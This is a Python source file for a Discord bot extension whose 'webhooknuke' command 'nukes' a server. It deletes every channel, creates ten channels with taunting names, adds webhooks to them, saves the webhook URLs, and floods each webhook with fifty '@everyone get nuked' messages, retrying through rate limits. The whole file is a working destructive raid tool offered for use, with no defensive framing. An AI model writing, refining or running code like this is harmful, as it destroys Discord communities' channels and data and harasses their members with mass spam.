import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import json

NUKE_WEBHOOK_FILE = "db/nukewebhooks.json"

class WebhookNuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def save_webhooks(self, webhook_urls):
        os.makedirs(os.path.dirname(NUKE_WEBHOOK_FILE), exist_ok=True)
        with open(NUKE_WEBHOOK_FILE, "w", encoding="utf-8") as f:
            json.dump([{"url": url} for url in webhook_urls], f, indent=4)

    @commands.command()
    async def webhooknuke(self, ctx):
        await ctx.message.delete()

        guild = ctx.guild
        message = "@everyone get nuked 🤣"
        amount_per_webhook = 50

        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)

        names = ["Esorlex owned 🤑", "Skidded off sus 😍"]

        created_channels = []
        for i in range(10):
            try:
                name = names[i % len(names)]
                ch = await guild.create_text_channel(name)
                created_channels.append(ch)
            except:
                pass

        webhooks = []
        for ch in created_channels:
            try:
                webhook = await ch.create_webhook(name="Esorlex Nuke Webhook | Sus smoked you")
                webhooks.append(webhook)
            except:
                pass

        if not webhooks:
            return

        self.save_webhooks([wh.url for wh in webhooks])

        async with aiohttp.ClientSession() as session:
            tasks = [
                self.spam_webhook(session, webhook, message, amount_per_webhook)
                for webhook in webhooks
            ]
            await asyncio.gather(*tasks, return_exceptions=True)

    async def spam_webhook(self, session, webhook, message, count):
        for _ in range(count):
            await self.send_webhook(session, webhook, message)

    async def send_webhook(self, session, webhook, message, max_retries=5):
        retries = 0
        while retries < max_retries:
            try:
                async with session.post(webhook.url, json={"content": message}) as resp:
                    if resp.status in (200, 204):
                        return True
                    elif resp.status == 429:
                        data = await resp.json()
                        retry_after = data.get("retry_after", 1)
                        await asyncio.sleep(retry_after)
            except:
                pass
            retries += 1
            await asyncio.sleep(0)
        return False

async def setup(bot):
    await bot.add_cog(WebhookNuke(bot))
